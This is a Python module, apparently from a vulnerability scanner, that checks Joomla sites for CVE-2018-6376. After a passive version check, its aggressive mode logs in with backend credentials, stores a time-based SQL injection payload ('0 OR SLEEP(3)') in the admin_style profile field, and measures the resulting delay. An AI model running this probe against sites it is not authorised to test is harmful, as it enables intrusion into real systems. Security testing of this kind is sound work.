from __future__ import annotations

import html
import re
import time
from collections.abc import Callable
from typing import Any

from ...core.args import aggressive_value
from ...core.http import HttpClient, form_encode, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding

CVECheckResult = Finding
from ...core.versions import parse_version_required, parse_version_safe

CVE_ID = "CVE-2018-6376"
NAME = "Joomla Hathor postinstall message second-order SQL injection"
COMPONENT = "Joomla core tpl_hathor postinstall"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
AFFECTED_JOOMLA_VERSIONS = ["3.7.0-3.8.3"]
AFFECTED_RULE = (
    "Joomla 3.7.0-3.8.3; a backend account (Manager is enough) stores an array "
    "admin_style user param that the Hathor postinstall condition concatenates "
    "uncast into SQL"
)
FIXED_RULE = "Update to Joomla 3.8.4 or newer"
ADMIN_LOGIN_PATH = "/administrator/index.php"
PROFILE_PATH = "/administrator/index.php?option=com_admin&view=profile&layout=edit"
BENIGN_STYLE = "1"
SLEEP_PAYLOAD = "0 OR SLEEP(3)"
SLEEP_SECONDS = 3
CONFIRM_DELAY = 2.5


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return "INCONCLUSIVE"
    if parse_version_required("3.7.0") <= parsed < parse_version_required("3.8.4"):
        return "LIKELY_VULNERABLE"
    if parsed < parse_version_required("3.7.0"):
        return "NOT_AFFECTED"
    return "PATCHED"


def passive_result(joomla_version: str | None) -> Finding:
    status = classify_version(joomla_version)
    confidence = "HIGH" if status in {"LIKELY_VULNERABLE", "PATCHED", "NOT_AFFECTED"} else "MEDIUM"
    details = {
        "LIKELY_VULNERABLE": (
            f"Joomla {joomla_version} is in the affected range; the uncast admin_style array "
            "must be verified live with a seeded backend account."
        ),
        "PATCHED": f"Joomla {joomla_version} casts admin_style to int before the postinstall query.",
        "NOT_AFFECTED": f"Joomla {joomla_version} predates the Hathor postinstall message.",
        "INCONCLUSIVE": "Joomla was detected, but the core version could not be determined.",
    }
    return Finding(
        cve=CVE_ID, name=NAME, status=status, confidence=confidence,
        component=COMPONENT, component_version=joomla_version, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=details[status],
        action="Upgrade to Joomla 3.8.4 or newer and review backend accounts with profile-edit rights.",
    )


def _token(page: str) -> str | None:
    match = re.search(r'type="hidden" name="([a-f0-9]{32})" value="1"', page)
    return match.group(1) if match else None


def _form_fields(form_html: str) -> dict[str, str]:
    fields: dict[str, str] = {}
    for tag in re.findall(r"<input\b[^>]*>", form_html, re.IGNORECASE):
        name = re.search(r'name="([^"]*)"', tag)
        if not name:
            continue
        value = re.search(r'value="([^"]*)"', tag)
        fields[html.unescape(name.group(1))] = html.unescape(value.group(1)) if value else ""
    return fields


def _profile_form(page: str) -> tuple[str, dict[str, str], str] | None:
    """Return (action, fields, token) for the profile edit form."""
    marker = 'name="jform[params][admin_style]"'
    index = page.find(marker)
    if index == -1:
        return None
    start = page.rfind("<form", 0, index)
    end = page.find("</form>", index)
    if start == -1 or end == -1:
        return None
    form = page[start:end]
    action = re.search(r'action="([^"]+)"', form, re.IGNORECASE)
    token = _token(form)
    if not action or not token:
        return None
    return html.unescape(action.group(1)), _form_fields(form), token


def _login(client: HttpClient, base: str, user: str, password: str, timeout: int) -> bool:
    page = client.get(f"{base}{ADMIN_LOGIN_PATH}", timeout=timeout)
    body = page.get("body", "") or ""
    token = _token(body)
    if not token:
        return False
    client.request(
        f"{base}{ADMIN_LOGIN_PATH}",
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode({
            "username": user,
            "passwd": password,
            "option": "com_login",
            "task": "login",
            "return": "aW5kZXgucGhw",
            token: "1",
        }),
        timeout=timeout,
        follow_redirects=False,
    )
    return True


def _save_admin_style(
    client: HttpClient, base: str, timeout: int, style_value: str
) -> bool:
    page = client.get(f"{base}{PROFILE_PATH}", timeout=timeout)
    parsed = _profile_form(page.get("body", "") or "")
    if parsed is None:
        return False
    action, fields, token = parsed
    if action.startswith("/"):
        action = f"{base}{action}"
    fields.pop("jform[params][admin_style]", None)
    fields["jform[params][admin_style][0]"] = style_value
    fields["task"] = "profile.save"
    fields[token] = "1"
    response = client.request(
        action,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode(fields),
        timeout=timeout,
        follow_redirects=False,
    )
    return response.get("status") in (200, 303)


def _timed_get(
    client: HttpClient, url: str, timeout: int, clock: Callable[[], float]
) -> tuple[float, dict[str, Any]]:
    start = clock()
    response = client.get(url, timeout=timeout)
    return clock() - start, response


def run_aggressive_probe(
    target_url: str,
    timeout: int = 30,
    proxy: str | None = None,
    admin_user: str | None = None,
    admin_password: str | None = None,
    clock: Callable[[], float] = time.monotonic,
) -> Finding:
    base = normalize_url(target_url)
    if not admin_user or not admin_password:
        return Finding(
            cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=False,
            proof_url=f"{base}{ADMIN_LOGIN_PATH}",
            detail=(
                "The probe needs a backend account (Manager is enough) via "
                "--aggressive-arg admin_user=... admin_password=...; nothing was sent."
            ),
            action="Re-run with lab backend credentials on an authorized target.",
        )
    client = HttpClient(timeout=timeout, proxy=proxy)
    preflight = client.get(f"{base}/", timeout=timeout)
    if is_transport_error(preflight):
        return Finding(
            cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}/",
            detail=f"The target could not be reached ({transport_error_detail(preflight)}).",
            action="Retry when the target is reachable.",
        )
    if not _login(client, base, admin_user, admin_password, timeout):
        return Finding(
            cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{ADMIN_LOGIN_PATH}",
            detail="The administrator login form was not available, so no payload was stored.",
            action="Verify the backend login route and credentials.",
        )
    if not _save_admin_style(client, base, timeout, BENIGN_STYLE):
        return Finding(
            cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{PROFILE_PATH}",
            detail=(
                "The account could not save its own profile (admin_style baseline write failed), "
                "so the second-order payload could not be stored."
            ),
            action="Verify the account may edit its profile in the backend.",
        )
    baseline, _ = _timed_get(client, f"{base}{ADMIN_LOGIN_PATH}", timeout, clock)
    stored = _save_admin_style(client, base, timeout, SLEEP_PAYLOAD)
    injected, injected_response = _timed_get(client, f"{base}{ADMIN_LOGIN_PATH}", timeout, clock)
    # Best-effort restore so the lab account is left in a benign state.
    _save_admin_style(client, base, timeout, BENIGN_STYLE)

    delay = injected - baseline
    evidence: dict[str, object] = {
        "baseline_seconds": round(baseline, 2),
        "injected_seconds": round(injected, 2),
        "delay_seconds": round(delay, 2),
        "payload_stored": stored,
        "payload": SLEEP_PAYLOAD,
        "dashboard_status": injected_response.get("status"),
    }
    if stored and delay >= CONFIRM_DELAY:
        return Finding(
            cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{ADMIN_LOGIN_PATH}",
            evidence=evidence,
            detail=(
                f"The backend account stored an array admin_style value ({SLEEP_PAYLOAD!r}) and the "
                f"next dashboard load took {injected:.2f}s versus {baseline:.2f}s baseline "
                f"({delay:.2f}s delay, SLEEP({SLEEP_SECONDS}) executed). "
                "The Hathor postinstall condition concatenates the uncast array element into SQL."
            ),
            action=(
                "Upgrade to Joomla 3.8.4 or newer, remove the stored admin_style payload, "
                "and audit backend accounts that can edit profile params."
            ),
        )
    return Finding(
        cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
        component=COMPONENT, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT, exploit_ran=True,
        proof_url=f"{base}{ADMIN_LOGIN_PATH}",
        evidence=evidence,
        detail=(
            "The payload was stored but the dashboard response showed no timing differential "
            f"({injected:.2f}s versus {baseline:.2f}s), consistent with the fixed int cast."
            if stored
            else "The admin_style payload could not be stored, so the injection was not triggered."
        ),
        action="Verify the target runs Joomla 3.8.4 or newer.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 30,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    result = passive_result(joomla_version)
    if not run_exploit_check:
        return result
    if exploit_mode != "aggressive":
        result.detail += " This CVE requires an aggressive lab-only second-order SQLi proof."
        return result
    if result.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        return result
    admin_user = aggressive_value(aggressive_args, aggressive_command, "admin_user")
    admin_password = aggressive_value(aggressive_args, aggressive_command, "admin_password")
    if (not admin_user or not admin_password) and aggressive_command and ":" in aggressive_command:
        admin_user, _, admin_password = aggressive_command.partition(":")
    probe = run_aggressive_probe(
        target_url, timeout=timeout, proxy=proxy,
        admin_user=admin_user, admin_password=admin_password,
    )
    probe.component_version = result.component_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT,
        "affected_rule": AFFECTED_RULE, "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE,
        "vulnerability_type": "SQL Injection",
        "module_version": "1.0.0", "last_reviewed": "2026-11-11", "updated": "2026-11-11",
        "required_detectors": [],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2018-6376",
            "https://developer.joomla.org/security-centre/722-20180104-core-sqli-vulnerability.html",
            "https://www.sonarsource.com/blog/joomla-privilege-escalation-via-sql-injection/",
        ],
    }
